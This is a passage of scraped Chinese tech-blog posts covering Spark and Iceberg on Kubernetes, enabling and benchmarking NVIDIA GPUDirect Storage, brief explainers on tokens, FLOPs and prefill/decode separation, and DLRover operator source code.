\u0026ldquo;default\u0026rdquo;。\n5.3 使用 spark-submit 提交 Spark 作业 进入 Pod 终端 1 kubectl -n spark exec -it spark-iceberg-749cf599dd-xdzlg bash 提交 Spark 作业 在上面的步骤中，已经给 default ServiceAccount 设置了足够权限，这里直接指定 master 地址即可。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 /opt/spark/bin/spark-submit \\ --master k8s://https://x.x.x.x:6443 \\ --deploy-mode cluster \\ --name spark-iceberg-example \\ --class org.apache.spark.deploy.python.PythonRunner \\ --conf spark.executor.instances=2 \\ --conf spark.executor.memory=16G \\ --conf spark.executor.cores=8 \\ --conf spark.driver.memory=16g \\ --conf spark.pyspark.python=/usr/bin/python3 \\ --conf spark.kubernetes.container.image.pullPolicy=Always \\ --conf spark.kubernetes.container.image=shaowenchen/spark:3.5.1-python3-s3 \\ --conf spark.eventLog.enabled=false \\ --conf spark.kubernetes.namespace=spark \\ --conf spark.kubernetes.authenticate.driver.serviceAccountName=default \\ --conf spark.hadoop.fs.s3a.bucket.name=mybucket \\ --conf spark.hadoop.fs.s3a.access.key=xxx \\ --conf spark.hadoop.fs.s3a.secret.key=xxx \\ --conf spark.kubernetes.file.upload.path=s3a://mybucket/datalake/spark-warehouse/upload \\ /opt/spark/examples/src/main/python/pi.py 其中的 \u0026ndash;conf 包含大量配置参数，详见 https://spark.apache.org/docs/latest/running-on-kubernetes.html\n执行时，会输出与 Kubernetes 交互的信息，主要是 Pod 的状态\n查看相关的 Pod 1 2 3 spark-iceberg-example-e611cd91cb54a5fc-driver 0/1 Completed 0 50s pythonpi-e80edc91cb54c2eb-exec-1 0/1 Terminating 0 5s pythonpi-e80edc91cb54c2eb-exec-2 0/1 Terminating 0 5s 与上面一样，driver 执行完成之后会保留下来，executor 会被删除掉。\n查看相关日志 1 2 3 kubectl -n spark logs spark-iceberg-example-e611cd91cb54a5fc-driver -f |grep roughly Pi is roughly 3.144840 6. 使用 Spark 和 Iceberg 在集群处理数据 由于在生产环境下，Spark 处理的脚本有时会发生调整，为了便于更新和管理脚本，在 Spark 处理数据的脚本需要通过 PVC 挂载到 Driver 、Executor 中。\n参考 https://github.com/shaowenchen/demo/blob/master/spark-3.5-iceberg/sparkapp.yaml\n7. 使用 Argo Webhook 对外提供 Spark 处理 API 创建 Sensor https://github.com/shaowenchen/demo/blob/master/spark-3.5-iceberg/argo-sensor.yaml\n创建一个 EventSource 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 apiVersion: argoproj.io/v1alpha1 kind: EventSource metadata: name: spark-webhook namespace: argo spec: service: ports: - port: 13000 targetPort: 13000 webhook: sparkapp-start: port: \u0026#34;13000\u0026#34; endpoint: /sparkapp/start method: POST url: \u0026#34;\u0026#34; 检测 Sensor Pod 状态 1 2 3 kubectl -n argo get pod |grep spark sparkapp-start-sensor-sensor-gkxzn-58d7648fd7-fs8np 1/1 Running 0 22s 查看 Webhook 的服务端口 1 2 3 4 5 kubectl -n argo get svc NAME TYPE CLUSTER-IP EXTERNAL-IP PORT（S） AGE eventbus-default-stan-svc ClusterIP None \u0026lt;none\u0026gt; 4222/TCP,6222/TCP,8222/TCP 291d spark-webhook-eventsource-svc ClusterIP 10.103.215.1 \u0026lt;none\u0026gt; 13000:30001/TCP 291d 调用 API 接口触发任务 1 curl -d \u0026#39;{\u0026#34;script\u0026#34;:\u0026#34;spark-example.py\u0026#34;, \u0026#34;pvc\u0026#34;:\u0026#34;mypvc\u0026#34;, \u0026#34;path\u0026#34;:\u0026#34;spark\u0026#34;, \u0026#34;executor\u0026#34;:2, \u0026#34;ak\u0026#34;:\u0026#34;xxx\u0026#34;, \u0026#34;sk\u0026#34;:\u0026#34;xxx\u0026#34;, \u0026#34;endpoint\u0026#34;:\u0026#34;ks3-cn-beijing-internal.ksyuncs.com\u0026#34;, \u0026#34;bucket\u0026#34;: \u0026#34;mybucket\u0026#34;}\u0026#39; -H \u0026#34;Content-Type: application/json\u0026#34; -X POST http://localhost:31300/sparkapp/start -v 通过 script 可以指定启动脚本，path 可以用来隔离 pvc 中的目录。\n8. 总结 本篇记录了部署基于 Spark 、Iceberg、Hive Metastore 的数据处理软件栈的流程。主要内容如下:\n介绍了 Spark 、Iceberg、Hive Metastore 的基本概念 部署 Hive Metastore、Spark Operator 测试使用 Standalone 模式运行 Spark 作业 测试使用 spark-submit、yaml 方式运行 Spark 作业 通过 Argo Webhook 对外提供 Spark 数据处理 API 9. 参考 https://pipekit.io/blog/argo-workflows-spark https://github.com/shaowenchen/demo/tree/master/spark-3.5-iceberg ","description":"","id":26,"section":"post","tags":["博文","Spark","Iceberg","Kubernetes"],"title":"使用 Iceberg 和 Spark 在 Kubernetes 上处理数据","uri":"https://www.chenshaowen.com/blog/use-iceberg-and-spark-on-kubernetes.html"},{"content":"1. 什么是 GDS（GPUDirectStorage） GDS 允许 RDMA 网卡直接访问 GPU 内存，有助于增加 GPU 应用读写文件的 IO 带宽，减少 IO 时延，并降低其 CPU 负载。\n客户端在开启 GDS 特性后，文件将以 O_DIRECT 方式打开，客户端不会再缓存文件数据。应用层读写文件时，客户端通过 nvidia-fs.ko 将应用层的 GPU 内存地址转换成 DMA 地址，并将其发送到服务端，由服务端 RDMA 网卡负责对客户端的 DMA 地址读取或填充。\n2. 使用要求 2.1 系统要求 OS Ubuntu 20.04，Ubuntu 22.04，Ubuntu 24.04，RHEL 8， RHEL 9\nCUDA Toolkit\nGCC\n2.2 存储要求 在使用 GDS 时，需要应用层调用 cuFile API 才能正常工作。只有有限的存储系统实现了对 GDS 的支持:\nNVMe NVMeOF SCSI ScaleFlux CSD NVMesh DDN EXAScaler IBM Spectrum Scale NFS BeeGFS WekaFS \u0026hellip; 这里有一份 2021 年底的支持列表可以参考: https://developer.nvidia.com/zh-cn/blog/accelerating-io-in-the-modern-data-center-magnum-io-storage-partnerships/\n3. 安装 GDS 3.1 安装依赖项 安装 cuda-keyring 1 2 3 4 5 export distro=ubuntu2004 export arch=x86_64 wget https://developer.download.nvidia.com/compute/cuda/repos/$distro/$arch/cuda-keyring_1.1-1_all.deb sudo dpkg -i cuda-keyring_1.1-1_all.deb apt-get update 安装 nvidia-fs 1 2 3 apt list --installed | grep nvidia-fs apt-cache search nvidia-fs apt-get install nvidia-fs-dkms nvidia-fs 查看当前 Driver 版本 1 2 3 nvidia-smi | grep \u0026#34;Driver Version\u0026#34; | NVIDIA-SMI 535.129.03 Driver Version: 535.129.03 CUDA Version: 12.2 | 安装 libnvidia-nscq 安装之前需要检查一下是否已经安装，再去寻找与 Driver 版本匹配的版本。\n1 2 3 apt list --installed | grep libnvidia_nscq apt-cache search libnvidia-nscq apt-get install libnvidia-nscq-535 安装 fabricmanager 安装之前需要检查一下是否已经安装，再去寻找与 Driver 版本匹配的版本。\n1 2 3 apt list --installed | grep fabricmanager apt-cache search fabricmanager apt-get install nvidia-fabricmanager-535 3.2 安装 GDS 安装 GDS 1 2 3 apt list --installed | grep nvidia-gds apt-cache search nvidia-gds apt-get install nvidia-gds-12-2 检查 GDS 状态 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 /usr/local/cuda-12.2/gds/tools/gdscheck.py -p GDS release version: 1.7.2.10 nvidia_fs version: 2.22 libcufile version: 2.12 Platform: x86_64 ============ ENVIRONMENT: ============ ===================== DRIVER CONFIGURATION: ===================== NVMe : Supported NVMeOF : Unsupported SCSI : Unsupported ScaleFlux CSD : Unsupported NVMesh : Unsupported DDN EXAScaler : Unsupported IBM Spectrum Scale : Unsupported NFS : Unsupported BeeGFS : Unsupported WekaFS : Unsupported Userspace RDMA : Unsupported --Mellanox PeerDirect : Enabled --rdma library : Not Loaded (libcufile_rdma.so) --rdma devices : Not configured --rdma_device_status : Up: 0 Down: 0 ===================== CUFILE CONFIGURATION: ===================== properties.use_compat_mode : true properties.force_compat_mode : false properties.gds_rdma_write_support : true properties.use_poll_mode : false properties.poll_mode_max_size_kb : 4 properties.max_batch_io_size : 128 properties.max_batch_io_timeout_msecs : 5 properties.max_direct_io_size_kb : 16384 properties.max_device_cache_size_kb : 131072 properties.max_device_pinned_mem_size_kb : 33554432 properties.posix_pool_slab_size_kb : 4 1024 16384 properties.posix_pool_slab_count : 128 64 32 properties.rdma_peer_affinity_policy : RoundRobin properties.rdma_dynamic_routing : 0 fs.generic.posix_unaligned_writes : false fs.lustre.posix_gds_min_kb: 0 fs.beegfs.posix_gds_min_kb: 0 fs.weka.rdma_write_support: false fs.gpfs.gds_write_support: false profile.nvtx : false profile.cufile_stats : 0 miscellaneous.api_check_aggressive : false execution.max_io_threads : 4 execution.max_io_queue_depth : 128 execution.parallel_io : true execution.min_io_threshold_size_kb : 8192 execution.max_request_parallelism : 4 properties.force_odirect_mode : false properties.prefer_iouring : false ========= GPU INFO: ========= GPU index 0 NVIDIA A800-SXM4-80GB bar:1 bar size (MiB):131072 supports GDS，IOMMU State: Disabled GPU index 1 NVIDIA A800-SXM4-80GB bar:1 bar size (MiB):131072 supports GDS，IOMMU State: Disabled GPU index 2 NVIDIA A800-SXM4-80GB bar:1 bar size (MiB):131072 supports GDS，IOMMU State: Disabled GPU index 3 NVIDIA A800-SXM4-80GB bar:1 bar size (MiB):131072 supports GDS，IOMMU State: Disabled GPU index 4 NVIDIA A800-SXM4-80GB bar:1 bar size (MiB):131072 supports GDS，IOMMU State: Disabled GPU index 5 NVIDIA A800-SXM4-80GB bar:1 bar size (MiB):131072 supports GDS，IOMMU State: Disabled GPU index 6 NVIDIA A800-SXM4-80GB bar:1 bar size (MiB):131072 supports GDS，IOMMU State: Disabled GPU index 7 NVIDIA A800-SXM4-80GB bar:1 bar size (MiB):131072 supports GDS，IOMMU State: Disabled ============== PLATFORM INFO: ============== IOMMU: disabled Platform verification succeeded 由于没有额外支持 GDS 的存储系统，仅 NVMe 设备处于支持 GDS 的状态。\n4. 测试 GDS 4.1 创建一个 100G 的文件 1 time dd if=/dev/zero of=/data/test/dd.txt bs=40M count=2500 4.2 不同传输模型下的测试 /usr/local/cuda-12.2/gds/tools/gdsio 提供了 8 个不同的测试模式，分别是：\n0 - Storage-\u0026gt;GPU (GDS) GPU Direct Storage (GDS): 数据直接从存储传输到 GPU，绕过 CPU。这种模式减少了延迟并增加了吞吐量，特别适合需要 GPU 高速访问数据的场景。\n1 2 3 /usr/local/cuda-12.2/gds/tools/gdsio -f /data/test/dd.txt -d 0 -w 4 -s 10G -i 1M -I 0 -x 0 IoType: READ XferType: GPUD Threads: 4 DataSetSize: 10203136/10240000(KiB) IOSize: 1024(KiB) Throughput: 4.443489 GiB/sec，Avg_Latency: 878.805571 usecs ops: 9964 total_time 2.189826 secs 1 - Storage-\u0026gt;CPU 存储到 CPU 的传统传输: 数据首先从存储传输到 CPU。这是传统的处理方式，CPU 接收并处理数据，然后再传递给其他组件，比如 GPU。\n1 2 3 /usr/local/cuda-12.2/gds/tools/gdsio -f /data/test/dd.txt -d 0 -w 4 -s 10G -i 1M -I 0 -x 1 IoType: READ XferType: CPUONLY Threads: 4 DataSetSize: 10240000/10240000(KiB) IOSize: 1024(KiB) Throughput: 4.414133 GiB/sec，Avg_Latency: 868.366600 usecs ops: 10000 total_time 2.212354 secs 2 - Storage-\u0026gt;CPU-\u0026gt;GPU 存储到 CPU 再到 GPU: 数据先从存储传输到 CPU，经过处理后再传输到 GPU。这是更常见的流程，适用于需要 CPU 进行数据预处理的场景。\n1 2 3 /usr/local/cuda-12.2/gds/tools/gdsio -f /data/test/dd.txt -d 0 -w 4 -s 10G -i 1M -I 0 -x 2 IoType: READ XferType: CPU_GPU Threads: 4 DataSetSize: 10142720/10240000(KiB) IOSize: 1024(KiB) Throughput: 4.312804 GiB/sec，Avg_Latency: 905.410136 usecs ops: 9905 total_time 2.242822 secs 3 - Storage-\u0026gt;CPU-\u0026gt;GPU_ASYNC 存储到 CPU 再到 GPU 的异步传输: 数据先从存储传输到 CPU，然后异步传输到 GPU。这种模式允许 CPU 在等待数据传输完成的同时执行其他任务，提高了效率。\n1 2 3 /usr/local/cuda-12.2/gds/tools/gdsio -f /data/test/dd.txt -d 0 -w 4 -s 10G -i 1M -I 0 -x 3 IoType: READ XferType: CPU_ASYNC_GPU Threads: 4 DataSetSize: 10167296/10240000(KiB) IOSize: 1024(KiB) Throughput: 3.318594 GiB/sec，Avg_Latency: 1176.616969 usecs ops: 9929 total_time 2.921806 secs 4 - Storage-\u0026gt;PAGE_CACHE-\u0026gt;CPU-\u0026gt;GPU 存储-\u0026gt;页缓存-\u0026gt;CPU-\u0026gt;GPU: 数据首先进入操作系统的页缓存，然后传输到 CPU，最后传输到 GPU。页缓存可以加快对常用数据的访问速度，但会增加一步缓存操作。\n1 2 3 /usr/local/cuda-12.2/gds/tools/gdsio -f /data/test/dd.txt -d 0 -w 4 -s 10G -i 1M -I 0 -x 4 IoType: READ XferType: CPU_CACHED_GPU Threads: 4 DataSetSize: 10011648/10240000(KiB) IOSize: 1024(KiB) Throughput: 1.770729 GiB/sec，Avg_Latency: 2206.536591 usecs ops: 9777 total_time 5.392046 secs 5 - Storage-\u0026gt;GPU_ASYNC 存储到 GPU 的异步传输: 数据直接从存储异步传输到 GPU，允许其他操作在传输过程中继续执行，减少等待时间，提高整体处理效率。\n1 2 3 /usr/local/cuda-12.2/gds/tools/gdsio -f /data/test/dd.txt -d 0 -w 4 -s 10G -i 1M -I 0 -x 5 IoType: READ XferType: ASYNC Threads: 4 DataSetSize: 10160128/10240000(KiB) IOSize: 1024(KiB) Throughput: 3.053654 GiB/sec，Avg_Latency: 1272.345376 usecs ops: 9922 total_time 3.173068 secs 6 - Storage-\u0026gt;GPU_BATCH 存储到 GPU 的批处理传输: 数据从存储传输到 GPU，但采用批处理的方式进行。适用于需要一次性处理大量数据的情况。\n1 2 3 /usr/local/cuda-12.2/gds/tools/gdsio -f /data/test/dd.txt -d 0 -w 4 -s 10G -i 1M -I 0 -x 6 IoType: READ XferType: GPU_BATCH Threads: 1 IoDepth: 4 DataSetSize: 10240000/10240000(KiB) IOSize: 1024(KiB) Throughput: 4.422783 GiB/sec，Avg_Latency: 873.240876 usecs ops: 10001 total_time 2.208027 secs 7 - Storage-\u0026gt;GPU_BATCH_STREAM 存储到 GPU 的流式批处理传输: 这是一种批处理和流式处理结合的模式，数据从存储传输到 GPU 时，采用流式处理进行批处理，进一步优化了处理速度和资源利用率。\n1 2 3 /usr/local/cuda-12.2/gds/tools/gdsio -f /data/test/dd.txt -d 0 -w 4 -s 10G -i 1M -I 0 -x 7 IoType: READ XferType: GPU_BATCH_STREAM Threads: 1 IoDepth: 4 DataSetSize: 10240000/10240000(KiB) IOSize: 1024(KiB) Throughput: 2.437489 GiB/sec，Avg_Latency: 1600.979502 usecs ops: 10001 total_time 4.006429 secs 4.3 不同模式下的测试结果 模式 速度 (GiB/sec) 0 - Storage-\u0026gt;GPU (GDS) 4.443489 GiB/sec 1 - Storage-\u0026gt;CPU 4.414133 GiB/sec 2 - Storage-\u0026gt;CPU-\u0026gt;GPU 4.312804 GiB/sec 3 - Storage-\u0026gt;CPU-\u0026gt;GPU_ASYNC 3.318594 GiB/sec 4 - Storage-\u0026gt;PAGE_CACHE-\u0026gt;CPU-\u0026gt;GPU 1.770729 GiB/sec 5 - Storage-\u0026gt;GPU_ASYNC 3.053654 GiB/sec 6 - Storage-\u0026gt;GPU_BATCH 4.422783 GiB/sec 7 - Storage-\u0026gt;GPU_BATCH_STREAM 2.437489 GiB/sec Storage-\u0026gt;GPU (GDS)\\Storage-\u0026gt;GPU_BATCH: 速度最高，因为数据直接从存储传输到 GPU，绕过了 CPU Storage-\u0026gt;CPU-\u0026gt;GPU_ASYNC 和 Storage-\u0026gt;GPU_ASYNC: 异步模式下的速度稍低一些，因为异步传输增加了管理开销 Storage-\u0026gt;PAGE_CACHE-\u0026gt;CPU-\u0026gt;GPU: 数速度最低，因为数据经过了页缓存，增加了额外的步骤 4.3 验证 GDS 模式下对 CPU 的低使用率 主要对比模式 0 和 2\n0 - Storage-\u0026gt;GPU (GDS) 1 2 3 /usr/local/cuda-12.2/gds/tools/gdsio -f /data/test/dd.txt -d 0 -w 40 -s 100G -i 1M -I 0 -x 0 IoType: READ XferType: GPUD Threads: 40 DataSetSize: 101975040/102400000(KiB) IOSize: 1024(KiB) Throughput: 6.653494 GiB/sec，Avg_Latency: 5870.442542 usecs ops: 99585 total_time 14.616528 secs 1 2 PID USER PR NI VIRT RES SHR S %CPU %MEM TIME+ COMMAND 43261 root 20 0 41.9g 753364 700692 D 18.8 0.1 0:04.69 gdsio 2 - Storage-\u0026gt;CPU-\u0026gt;GPU 1 2 3 /usr/local/cuda-12.2/gds/tools/gdsio -f /data/test/dd.txt -d 0 -w 40 -s 100G -i 1M -I 0 -x 2 IoType: READ XferType: CPU_GPU Threads: 40 DataSetSize: 101849088/102400000(KiB) IOSize: 1024(KiB) Throughput: 6.649129 GiB/sec，Avg_Latency: 5874.226678 usecs ops: 99462 total_time 14.608058 secs 1 2 PID USER PR NI VIRT RES SHR S %CPU %MEM TIME+ COMMAND 47977 root 20 0 36.0g 153276 138644 S 63.7 0.0 0:03.27 gdsio 可以看到在 GDS 模式下，CPU 使用率只有经过 CPU 传输的 30%。\n5. 参考 https://github.com/cubefs/cubefs/wiki/Linux-Kernel-Client https://docs.nvidia.com/gpudirect-storage/ ","description":"","id":27,"section":"post","tags":["博文","GDS","GPU","AI"],"title":"GPU 主机如何开启 GDS","uri":"https://www.chenshaowen.com/blog/how-to-enable-gds-on-gpu-host.html"},{"content":"Token 是一个与数据紧密相关的单位，可以用来度量训练模型所需的语料量，还可以用来度量推理时的输入和输出长度。\n1. token 是什么 Token 可以是一个完整的单词、子词，甚至是一个字符。在语言模型中，文本被拆分为若干个 token，模型逐一处理这些 token 来生成预测或生成新文本。\n下面是一些经验，可以帮助理解 token 的长度:\n1 token ~= 5-6 chars in English 100 tokens ~= 90 words in English 或 10 sentences in English 可以通过 https://platform.openai.com/tokenizer 来查看 OpenAI 的 Tokenizer 表现，下面这个例子中，可以看到 token 与人理解的词并没有一一对应的关系。\n2. token 的 embedding 在上面的例子中，切换底部的 [Token IDs]，可以看到文本对应的 token 的 embedding ids.\n文本是给人看的，Token IDs 是给模型处理使用的。文本经过 Tokenizer 后，会变成一个或者多个 token，然后经过 embedding，转换为 Token IDs。而词表就存储着，每个 token 对应的 embedding id。\n3. 词表是怎么生成的 词表通常在模型训练之前生成，在整个训练过程中，词表不会发生变化。\nSentencePiece 是一个用于分词和词表生成的工具，支持多种分词算法，如 BPE、WordPiece 和 unigram。它被广泛应用于大模型的词表和分词器的构建中，例如 LLaMa、BLOOM、ChatGLM 和 Baichuan 等。\n使用 SentencePiece 可以从语料中生成一个完整的词表，也可以用来扩充现有的词表。\n比如，训练 LLaMa 时，使用的中文资料很少。在对模型针对中文语料进行微调之前，就需要先进行词表扩充，能够有效地提高模型的表现。\n4. token 与数据大小的关系 下面是一个典型模型与预训练数据规模的对照表：\n模型 参数规模 (B) 预训练数据规模（tokens） CodeGen 16 577 B LLaMA 65 1.4 T GPT-3 175 300 B 其中 ，B 表示 Billion 十亿，T 表示 Trillion 表示万亿。\n直接使用 tokens 作为数据规模有时不够直观，下面是 tokens 与文件大小的对照表：\n文本类型 平均每 Token 字节数 1GB 文本数据的 Token 数量 英文 6 字节 ( \\frac{1 \\times 2^{30}}{6} ≈ 0.167 B ) 中文 3 字节 ( \\frac{1 \\times 2^{30}}{3} ≈ 0.556 B ) 文本类型 平均每 Token 字节数 1B Token 的文件大小 英文 6 字节 ( 1B \\times 6 ) 字节 ≈ 5.6 GB 中文 3 字节 ( 1B \\times 3 ) 字节 ≈ 2.8 GB ","description":"","id":28,"section":"post","tags":["整理","机器学习","大模型","Token","什么是"],"title":"什么是 Token","uri":"https://www.chenshaowen.com/blog/what-is-token.html"},{"content":"1. 关于 FLOPs FLOPs（Floating Point Operations Per Second）指的是每秒执行的浮点数运算次数。\n具体地说：\n一次浮点加法：如 a + b，被计为一次浮点运算。 一次浮点乘法：如 a * b，也被计为一次浮点运算。 其他基本浮点运算：如除法和平方根，也可以被计为一次浮点运算。 2. 单、双精度 根据 ANSI/IEEE Std. 754-1985. 定义的格式，如果用于 32 位数字则称为单精度，用于 64 位数字的称为双精度。\n32 位（单精度）格式\n符号位 指数部分 尾数部分 1 位 8 位 23 位 64 位（双精度）格式\n符号位 指数部分 尾数部分 1 位 11 位 52 位 3. 常用单位 单位 定义 MFLOPS 每秒一百万（(10^6)）次浮点运算 GFLOPS 每秒十亿（(10^9)）次浮点运算 TFLOPS 每秒一万亿（(10^{12})）次浮点运算 PFLOPS 每秒一千万亿（(10^{15})）次浮点运算 EFLOPS 每秒一百亿亿（(10^{18})）次浮点运算 4. 常见设备与算力 设备型号 单精度算力(FP32) GeForce RTX 4090 82.58 TFLOPS NVIDIA H100 51.22 TFLOPS NVIDIA H20 44 TFLOPS NVIDIA A100 19.5 TFLOPS NVIDIA A800 19.5 TFLOPS Tesla V100 15.7 TFLOPS 这意味着，GeForce RTX 4090 每秒钟可以进行 82.58 万亿次单精度浮点运算。\n","description":"","id":29,"section":"post","tags":["整理","机器学习","大模型","FLOPs","什么是"],"title":"什么是 FLOPs","uri":"https://www.chenshaowen.com/blog/what-is-flops.html"},{"content":"1. 定义 LLM 推理过程中存在着两个截然不同的阶段，PD 分离就\n计算密集型的 Prefill 阶段， LLM 处理所有用户的 input，计算出对应的 KV Cache\n显存密集型的 Decode 阶段， 顺序的产生一个个的 token，每次访存只计算一个 token\n2. 指标 2.1 prefill 性能评估指标 TTFT（Time To First Token），表示生成第 1 个 token 所用的时间\nP90 TTFT SLO = 0.4s，意味着我们对该系统的要求是：90%的 request 的 TTFT 值都必须\u0026lt;=0.4\n2.2 decode 性能评估指标 TPOT（Time Per Output Token），产出每一个 response token 所用的时间\nP90 TPOT SLO = 0.04s，意味着我们对该系统的要求是，在 90% 的 request 的 TPOT 值都必须\u0026lt;=0.04s\n3. PD 分离带来的优势 在 long context 背景下，prefill 和 decode 阶段对计算和显存的需求非常不平衡。\n充分利用设备资源 prefill 采用高算力的 GPU，decode 采用低算力大显存的 GPU\n分开优化，能同时提升 TTFT 和 TPOT 指标 prefill 阶段应该限制 Batch Size 大小，decode 阶段应该增大 Batch Size 大小\n4. batching 策略 prefill 阶段 因为 prefill 阶段是计算密集型，随着 batch size 的增加，算力受限，吞吐量的增长趋势趋于平缓。\ndecode 阶段 因为 decode 阶段是带宽、内存密集，随着 batch size 的增加，吞吐量的增长趋势越来越显著。\n5. 参考 https://github.com/kvcache-ai/Mooncake ","description":"","id":30,"section":"post","tags":["整理","机器学习","大模型","PD","什么是"],"title":"什么是 PD 分离","uri":"https://www.chenshaowen.com/blog/what-is-pd-separation.html"},{"content":" 本文使用的 DLRover 版本是 0.3.7\n1. DLRover Operator 1.1 启动 ElasticJob 和 ScalePlan 的控制器 实现代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 // 创建 ElasticJob 的控制器 if err = controllers.NewElasticJobReconciler(mgr, masterImage).SetupWithManager(mgr); err != nil { setupLog.Error(err, \u0026#34;unable to create controller\u0026#34;, \u0026#34;controller\u0026#34;, \u0026#34;ElasticJob\u0026#34;) os.Exit(1) } // 创建 ScalePlan 的控制器 if err = controllers.NewScalePlanReconciler(mgr).SetupWithManager(mgr); err != nil { setupLog.Error(err, \u0026#34;unable to create controller\u0026#34;, \u0026#34;controller\u0026#34;, \u0026#34;ScalePlan\u0026#34;) os.Exit(1) } // 启动控制器 if err := mgr.Start(ctrl.SetupSignalHandler()); err != nil { setupLog.Error(err, \u0026#34;problem running manager\u0026#34;) os.Exit(1) } 这部分代码是使用 Kubebuilder 生成 Operator 框架时，自动生成的。\n1.2 ElasticJob 控制器 实现代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 switch job.Status.Phase { case \u0026#34;\u0026#34;, commonv1.JobCreated: // 创建一个 Master Pod r.initializeJob(job) err := r.createEasydlMaster(job) if err != nil { logger.Warningf(\u0026#34;Fail to create EasyDL Master\u0026#34;) return ctrl.Result{RequeueAfter: defaultPollInterval}, err } r.syncJobStateByReplicas(job) case commonv1.JobPending: r.syncJobStateByReplicas(job) case commonv1.JobRunning: r.handleFaultPods(job) r.syncJobStateByReplicas(job) case commonv1.JobScaling: scalePlan, err := r.getJobScalePlan(job) if err != nil { logger.Errorf(\u0026#34;Job %s: Fail to get scaleplan: %s\u0026#34;, job.Name, err) } if scalePlan.Status.Phase != commonv1.JobPending { logger.Infof(\u0026#34;Job %s: Skip a %s scaleplan %s.\u0026#34;, job.Name, scalePlan.Status.Phase, scalePlan.Name) return ctrl.Result{}, nil } r.updateScalePlanScaling(scalePlan) if scalePlan != nil { err := r.executeScaling(job, scalePlan) if err != nil { logger.Errorf(\u0026#34;Job %s: Fail to execute scaleplan %s: %s\u0026#34;, job.Name, scalePlan.Name, err) } } r.syncJobStateByReplicas(job) case commonv1.JobSucceeded: r.syncJobStateByReplicas(job) r.stopRunningPods(job) case commonv1.JobFailed: logger.Infof(\u0026#34;Job %s failed\u0026#34;, job.Name) r.syncJobStateByReplicas(job) r.stopRunningPods(job) default: logger.Warningf(\u0026#34;job %s unknown status %s\u0026#34;, job.Name, job.Status.Phase) } return ctrl.Result{}, nil 虽然有很多的 case 判断，但主要在做两件事:\n初始化时，创建 DLRover Master Pod 同步状态，将 ElasticJob 的状态同步到 ScalePlan、Pod 上 1.3 ScalePlan 控制器 代码:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 func (r *ScalePlanReconciler) updateJobToScaling( scalePlan *elasticv1alpha1.ScalePlan, job *elasticv1alpha1.ElasticJob, pollInterval time.Duration) (ctrl.Result, error) { if scalePlan.Status.Phase != commonv1.JobCreated \u0026amp;\u0026amp; scalePlan.Status.Phase != commonv1.JobPending { logger.Infof(\u0026#34;Skip a %s ScalePlan %s\u0026#34;, scalePlan.Status.Phase, scalePlan.Name) return ctrl.Result{}, nil } job.Status.ScalePlan = scalePlan.Name for taskType, resourceSpec := range scalePlan.Spec.ReplicaResourceSpecs { if job.Status.ReplicaStatuses[taskType].Initial == 0 { job.Status.ReplicaStatuses[taskType].Initial = int32(resourceSpec.Replicas) } } msg := fmt.Sprintf(\u0026#34;ElasticJob %s is scaling by %s with status %s.\u0026#34;, job.Name, scalePlan.Name, scalePlan.Status.Phase) logger.Infof(msg) if scalePlan.Status.Phase == commonv1.JobCreated { scalePlan.Status.Phase = commonv1.JobPending err := updateScalePlanStatus(r.Client, scalePlan) if err != nil { return ctrl.Result{RequeueAfter: pollInterval}, err } } common.UpdateStatus(\u0026amp;job.Status, commonv1.JobScaling, common.JobScalingReason, msg) err := updateElasticJobStatus(r.Client, job) if err != nil { logger.Errorf(\u0026#34;Failed to update job %s status to scaling with %s, err: %v\u0026#34;, job.Name, scalePlan.Name, err) return ctrl.Result{RequeueAfter: pollInterval}, err } return ctrl.Result{}, nil } 主要的逻辑是：\n将 scalePlan 关联到 ElasticJob 对象的 Status 中 更新 ScalePlan 和 ElasticJob 的状态 1.4 DLRover Master 的启动入口 从前面的代码可以看到 Operator 除了创建出一个 Master Pod 之外，主要是各种状态同步和关联，根本没有我们想要的容错逻辑。\n下面是创建 DLRover Master Pod 的模板配置:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 func NewMasterTemplateToJob(job *elasticv1alpha1.ElasticJob, masterImage string) { command := masterCommand + fmt.Sprintf( \u0026#34; --platform pyk8s --namespace %s --job_name %s --port %d\u0026#34;, job.Namespace, job.Name, masterServicePort, ) container := corev1.Container{ Name: \u0026#34;main\u0026#34;, Image: masterImage, ImagePullPolicy: defaultImagePullPolicy, Command: []string{\u0026#34;/bin/bash\u0026#34;, \u0026#34;-c\u0026#34;, command}, Resources: corev1.ResourceRequirements{ Requests: corev1.ResourceList{ corev1.ResourceCPU: resource.MustParse(initMasterContainerCPU), corev1.ResourceMemory: resource.MustParse(initMasterContainerMemory), corev1.ResourceEphemeralStorage: resource.MustParse(initMasterContainerStorage), }, Limits: corev1.ResourceList{ corev1.ResourceCPU: resource.MustParse(initMasterContainerCPU), corev1.ResourceMemory: resource.MustParse(initMasterContainerMemory), corev1.ResourceEphemeralStorage: resource.MustParse(initMasterContainerStorage), }, }, } podTemplate := \u0026amp;corev1.PodTemplateSpec{ Spec: corev1.PodSpec{ Containers: []corev1.Container{container}, RestartPolicy: corev1.RestartPolicyNever, }, } if _, ok := job.Spec.ReplicaSpecs[ReplicaTypeJobMaster]; ok { mainContainer := job.Spec.ReplicaSpecs[ReplicaTypeJobMaster].ReplicaSpec.Template.Spec.Containers[0] if mainContainer.Image != \u0026#34;\u0026#34; { podTemplate.Spec.Containers[0].Image = mainContainer.Image } if mainContainer.ImagePullPolicy != \u0026#34;\u0026#34; { podTemplate.Spec.Containers[0].ImagePullPolicy = mainContainer.ImagePullPolicy } if len(mainContainer.Env) \u0026gt; 0 { podTemplate.Spec.Containers[0].Env = append( podTemplate.Spec.Containers[0].Env, mainContainer.Env..., ) } } podIPEnv := corev1.EnvVar{ Name: envPodIP, ValueFrom: 